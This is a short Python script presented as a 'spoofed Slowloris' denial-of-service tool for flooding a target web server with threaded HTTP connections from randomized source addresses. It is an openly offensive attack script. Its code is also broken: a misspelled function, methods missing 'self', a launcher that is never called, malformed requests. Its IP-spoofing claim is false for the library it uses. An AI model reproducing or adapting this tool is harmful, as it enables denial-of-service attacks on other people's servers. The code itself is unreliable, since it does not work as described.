# slowloris.py
#                                   
# Spoofed SlowLoris DoS in Python.
# inspired by RSnake's perl tool                      
#             
#  Sheikh Viirus

import http.client
from random import randint
import sys
import threading

randomize = False
src = None
dst = None
port = None
conn = None

class SlowLoris(threading.Thread):
	global randomize, src, dst, port, conn
	
	def __init__(self):
		threading.Thread.__init__(self)
	
	def build_conn(_src, _dst, _port):
		return http.client.HTTPConnection(host = _dst, port = _port, timeout = 10, source_address = _src)
	
	def gen_ip():
		return '%i.%i.%i.%i' % (rand(), rand(), rand(), rand())
		
	def rand():
		return randit(1, 254)
		
	def run():
		conn = build_conn(gen_ip(), dst, port) if randomize else build_conn(src, dst, port)
		conn.request("GET /?" + str(randint(1,9991)) + " HTTP/1.1")

def show_help(bin):
	print('usage:\t%s [<src_addr>] <dst_addr> <port>' % bin)

def begin():
	while True:
		if threading.activeCount() <= 666:
			SlowLoris.start()

if __name__ == '__main__':
	if len(sys.argv) == 4:
		src = sys.argv[1]
		dst = sys.argv[2]
		port = sys.argv[3]
	elif len(sys.argv) == 3:
		randomize = True
		dst = sys.argv[1]
		port = sys.argv[2]
	else:
		show_help(sys.argv[0])
		exit()